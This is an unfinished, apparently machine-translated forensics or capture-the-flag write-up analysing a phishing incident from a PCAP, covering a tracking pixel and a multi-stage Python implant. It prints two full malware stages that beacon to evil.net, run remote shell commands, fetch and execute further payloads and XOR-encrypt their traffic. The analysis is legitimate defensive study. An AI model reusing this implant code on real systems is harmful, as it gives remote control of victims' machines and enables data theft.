> *This translation has been made by Claude, check out the original writeup [here](README.md).*

# --- WORK IN PROGRESS ---

# Grannupplysningen

## Task description
There has been an incident at the company where Anders works. Anders holds a position at the company that gives him access to a large part of the company's sensitive documents, and many decisions go through him. Privately, he has a strong interest in finance and is curious about what his neighbors' incomes look like. Fortunately, the company has recorded network traffic related to the incident, which is attached here as a PCAP.

Your task is to analyze the network traffic and write a report to the company so that they understand what happened.
To support your report, you can use the questions below as a starting point:

- What type of attack has Anders been subjected to?
- Can the attacker in any way see if Anders opened the email?
- Which IP addresses, ports, and protocols are involved in the incident, and what roles do they have?
- Is the attack automatic or manual (i.e. controlled by a human)?
- What has the attack done to Anders' computer?
- How did the attack proceed, step by step, including the methods used (such as vulnerabilities, encryption, or similar)?
## Overview
It looks like Anders received a phishing email from `Grannupplysningen <hacker@evil.net>` and downloaded a program to be able to see his neighbors' salaries. The link looks like this: `http://www.grannupplysningen.se/upplysning.py`, but points to `http://evil.net/stage_1?filename=upplysning.py`.

Furthermore, you can see a few different connections, so my thinking is that Anders has downloaded some form of malicious program that has kicked off a multi-stage attack and exfiltrated data. The question is just what, how, and to whom.
## The phishing email
Here is a picture of the rendered email:

![Screenshot](img/Pasted%20image%2020260302091714.png)

The email also contains a hidden png file that points to `http://evil.net/invisible.png?id=anders%40storaforetaget%2Ese`. What's interesting is that the png file has a parameter...

![Screenshot](img/Pasted%20image%2020260302092447.png)

Since it's 1x1 pixels, I'm thinking it's a tracking cookie - that when Anders opens the email and unknowingly wants to load the hidden image, a request is sent to `evil.net` with Anders' email address as the ID. It becomes like a receipt confirming that Anders has opened the email.
## Downloading the Python script
From packet 105 you can see when Anders downloads the python script from `evil.net/stage_1?filename=upplysning.py`. The script looks like the following:

```python
#!/usr/bin/env python3
import sys
import os

def main():
    print('V..lkommen till Grannupplysningen!')
    name = input('Ange ditt namn: ')
    input('Ange din adress: ')
    input('Ange din postadress: ')
    print('Kunde inte hitta n..gra grannar f..r %s! F..rs..k igen senare.' % name)

def payload():
    import requests
    import time
    import subprocess
    import urllib.parse
    import gzip
    
    session = requests.session()

    while True:
        response = session.get('http://evil.net/beacon_1').json()
        
        if response['command'] == 'sleep':
            time.sleep(response.get('parameters', [3])[0])

        elif response['command'] == 'shell':
            output = subprocess.check_output(response.get('parameters')[0], shell=True)
            session.post('http://evil.net/shell_1', json={'output': urllib.parse.quote(output, safe='')})

        elif response['command'] == 'download_and_execute':
            new_payload = session.get(response.get('parameters')[0]).content
            session_id = session.cookies['id']
            exec(new_payload, globals(), locals())
            break

if __name__ == '__main__':
    if '--payload' in sys.argv:
        payload()
    else:
        os.system('python3 %s --payload &> /dev/null &' % sys.argv[0])
        main()
```

The program lets the user enter their details and returns a response saying that there is no information about the neighbors to show. In the background, however, a few other things happen...

The attacker starts by sending a bunch of sleep commands:

![Screenshot](img/Pasted%20image%2020260302100209.png)

These are made to `/beacon_1`.

Then the attacker runs the shell command whoami:

![Screenshot](img/Pasted%20image%2020260302100227.png)

The attacker gets the response `Anders` from `/shell_1`

![Screenshot](img/Pasted%20image%2020260302100255.png)

After a few more sleep commands, the command `download_and_execute` is run:

![Screenshot](img/Pasted%20image%2020260302100348.png)

That makes a call to `/stage_2`, which indicates that a new payload is about to be downloaded and run.

At the end of the first script we can see the line `exec(new_payload, globals(), locals())`, which makes the new payload run immediately.

The file `soijijioajglkmw` is downloaded and contains the following:

```python
def entrypoint(session_id):
    import uuid
    import base64
    import requests
    import json
    import subprocess
    import time
    import marshal
    
    
    def rolling_xor(data, key):
        encrypted = b''
        for i, c in enumerate(data):
            encrypted += bytes((c ^ key[i % len(key)],))
        return encrypted

    key = uuid.getnode().to_bytes(length=6, byteorder='big')
    
    session = requests.session()
    session.cookies.set('id', session_id)
    
    session.post('http://evil.net/set_key', json={'key': base64.b64encode(key).decode()})
    
    while True:
        data = base64.b64decode(session.get('http://evil.net/beacon_2').content)
        response = json.loads(rolling_xor(data, key).decode())
        
        if response['command'] == 'sleep':
            time.sleep(response.get('parameters', [3])[0])

        elif response['command'] == 'shell':
            output = subprocess.check_output(response.get('parameters')[0], shell=True).decode()
            output_encrypted = rolling_xor(json.dumps({'output': output}).encode(), key)
            session.post('http://evil.net/shell_2', data=base64.b64encode(output_encrypted))

        elif response['command'] == 'download_and_execute':
            new_payload = session.get(response.get('parameters')[0]).content
            session_id = session.cookies['id']
            exec(marshal.loads(rolling_xor(new_payload, key)), globals(), locals())
            break


entrypoint(session_id)
```

It's a bit messier to understand what this script does, but the gist of it is probably that it extracts data from the target system, encrypts the data, and sends it to a server that the attacker has access to. Pretty much the same as the first script, but the data is encrypted with XOR.

You can, however, see that there's yet another `download_and_execute`, so the attacker will possibly initiate the download of yet another payload.

A post request is made to `/set_key`:

![Screenshot](img/Pasted%20image%2020260302102952.png)

`AkKsFwAD` should therefore be the key - the victim's MAC address - which you can check in CyberChef:

![Screenshot](img/Pasted%20image%2020260302104835.png)

The next stream contains the following:

![Screenshot](img/Pasted%20image%2020260302104954.png)

And decrypted we can see that a sleep command is sent

![Screenshot](img/Pasted%20image%2020260302105243.png)

Exactly the same as the previous script, but encrypted. After a number of sleep commands, another string is sent that decrypts to:

![Screenshot](img/Pasted%20image%2020260302105408.png)

A post request is sent with the output from the ls command:

![Screenshot](img/Pasted%20image%2020260302105457.png)

Which decrypts to:

![Screenshot](img/Pasted%20image%2020260302105522.png)

Then sleep until stream 36, when this is sent:

![Screenshot](img/Pasted%20image%2020260302105615.png)

And there's a file there - `hemligheter.png`

![Screenshot](img/Pasted%20image%2020260302105931.png)

After that, the command to find out which python version is running is executed, the answer is version `3.9.2`

Then sleep followed by a new `download_and_execute` at stream 51. Then the following is downloaded:

![Screenshot](img/Pasted%20image%2020260302110229.png)

Not the same simple type of XOR encryption and base64 encoding. We'll need to dig a bit more to understand the third payload that gets downloaded.

Looking more closely at how the data is formatted before being sent on, XOR is used, but the data being encrypted is in **marshal format**. To make it readable we need to use a disassembler or a decompiler.

# To be continued...
